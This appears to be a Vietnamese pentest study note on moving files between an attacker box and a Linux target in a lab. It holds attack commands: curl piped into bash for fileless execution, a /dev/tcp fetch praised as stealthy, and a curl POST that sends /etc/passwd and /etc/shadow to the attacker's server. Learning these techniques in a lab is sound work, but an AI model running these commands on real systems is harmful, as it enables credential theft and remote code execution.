---
title: "Linux File Transfer Methods"
date: 2026-04-16 00:02:00 +0700
categories: [Pentest, File Transfer]
tags: [file-transfer, linux, wget, curl, scp, base64, python, http]
---

> Covers các phương pháp transfer file trên môi trường **Linux ↔ Linux** (Pwnbox ↔ Target). Hiểu rõ để dùng được cả hai hướng: **download payload về target** và **exfiltrate data về Pwnbox**.
{: .prompt-info}

---

## 1. Base64 Encoding — Không cần network

Dùng khi **chỉ có terminal access**, không có kết nối mạng trực tiếp giữa hai máy.

```bash
# [PWNBOX] Encode file thành chuỗi base64 (1 dòng duy nhất)
cat id_rsa | base64 -w 0; echo

# [TARGET] Paste chuỗi base64 vào, decode ra file
echo -n 'LS0tLS1CRUdJ...' | base64 -d > id_rsa

# Verify integrity
md5sum id_rsa
```

> **Tại sao dùng `-w 0`?** Mặc định `base64` wrap dòng sau 76 ký tự → `-w 0` ép thành **1 dòng duy nhất**, dễ copy/paste hơn.
{: .prompt-tip}

---

## 2. wget & cURL — HTTP Download

```bash
# wget — dùng -O (chữ HOA)
wget https://example.com/LinEnum.sh -O /tmp/LinEnum.sh

# curl — dùng -o (chữ thường)
curl -o /tmp/LinEnum.sh https://example.com/LinEnum.sh
```

> **Mẹo nhớ:** `w`get → `-O` (Output, HOA) | `c`url → `-o` (output, thường)
{: .prompt-tip}

---

## 3. Fileless Attack — Thực thi không ghi disk

```bash
# curl pipe vào bash
curl https://example.com/LinEnum.sh | bash

# wget pipe vào python3
wget -qO- https://example.com/script.py | python3
```

> Một số payload như `mkfifo` vẫn tạo file tạm trên disk dù dùng pipe — kiểm tra kỹ payload trước khi kết luận là "fileless hoàn toàn".
{: .prompt-warning}

---

## 4. Bash `/dev/tcp` — Không cần binary nào

Built-in của Bash, không cần cài thêm gì. Yêu cầu Bash ≥ 2.04 (compiled với `--enable-net-redirections`).

```bash
# Bước 1 — mở TCP connection tới web server trên target
exec 3<>/dev/tcp/10.10.10.32/80

# Bước 2 — gửi HTTP GET request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3

# Bước 3 — đọc response (nội dung file)
cat <&3
```

> Target **không có curl, wget, python** — nhưng có Bash → đây là lựa chọn cuối cùng, cực kỳ stealthy.
{: .prompt-tip}

---

## 5. SSH / SCP — Encrypted Transfer

```bash
# Bật SSH server
sudo systemctl enable ssh && sudo systemctl start ssh

# Download từ target về Pwnbox
scp user@<TARGET_IP>:/root/secret.txt .

# Upload từ Pwnbox lên target
scp /tmp/shell.sh user@<TARGET_IP>:/tmp/

# Dùng private key
scp -i id_rsa user@<TARGET_IP>:/home/user/file.txt .
```

> **Syntax SCP:** Giống `cp` nhưng thêm `user@IP:` vào path remote. `scp <nguồn> <đích>` — nguồn hoặc đích có thể là remote.
{: .prompt-tip}

---

## 6. Mini Web Server trên Target

```bash
# Python 3 (ưu tiên)
python3 -m http.server 8000

# Python 2.7
python2.7 -m SimpleHTTPServer 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000
```

```bash
# [PWNBOX] Download file từ target về
wget http://<TARGET_IP>:8000/filetotransfer.txt
curl -o filetotransfer.txt http://<TARGET_IP>:8000/filetotransfer.txt
```

> Firewall inbound traffic trên target có thể bị block → nếu không kết nối được, kiểm tra firewall rules trước.
{: .prompt-warning}

---

## 7. Web Upload qua HTTPS — uploadserver

```bash
# [PWNBOX] Cài module
sudo python3 -m pip install --user uploadserver

# Tạo self-signed certificate
openssl req -x509 -out server.pem -keyout server.pem \
  -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Dựng HTTPS upload server
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```bash
# [TARGET] Upload file lên Pwnbox
curl -X POST https://<PWNBOX_IP>/upload \
  -F 'files=@/etc/passwd' \
  -F 'files=@/etc/shadow' \
  --insecure
```

> **Tại sao `--insecure`?** Self-signed cert không có CA ký → curl từ chối mặc định → `--insecure` bypass SSL verification.
{: .prompt-tip}

---

## Quick Reference

| Hướng | Phương pháp | Command chính | Điều kiện |
|---|---|---|---|
| Không cần mạng | Base64 | `cat file \| base64 -w 0` | Terminal access |
| Download | wget | `wget URL -O file` | wget có sẵn |
| Download | curl | `curl -o file URL` | curl có sẵn |
| Download | /dev/tcp | `exec 3<>/dev/tcp/IP/80` | Bash ≥ 2.04 |
| Download | SCP | `scp user@IP:/path .` | SSH creds |
| Download fileless | curl pipe | `curl URL \| bash` | curl có sẵn |
| Upload | SCP | `scp file user@IP:/path` | SSH creds |
| Upload | curl POST | `curl -X POST -F 'files=@/path'` | uploadserver |
| Serve file | Python/PHP/Ruby | `python3 -m http.server` | Language có sẵn |
